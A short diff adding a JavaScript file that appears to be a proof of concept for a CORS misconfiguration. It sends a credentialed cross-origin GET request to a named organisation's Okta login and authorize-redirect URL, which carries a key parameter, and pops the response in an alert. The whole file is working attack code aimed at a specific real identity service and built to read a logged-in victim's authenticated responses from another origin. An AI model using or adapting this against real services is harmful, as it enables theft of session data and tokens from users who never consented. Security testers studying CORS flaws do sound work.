@@ -1,0 +1,18 @@
+
+var invocation = new XMLHttpRequest();
+
+  invocation.onreadystatechange = function() {
+    if (invocation.readyState == XMLHttpRequest.DONE) {
+      alert(invocation.response);
+    }
+  }
+
+function cors(){
+  if(invocation) {
+    invocation.open('GET', "https://fireeye.okta.com/login/login.htm?fromURI=/oauth2/v1/authorize/redirect?okta_key=2CvpDHH5lg1PdBaxc5qW-5a6-ruqeqSrKrY8dxCC03",);
+    invocation.withCredentials = true;
+    invocation.send(); 
+  }
+}
+
+cors();
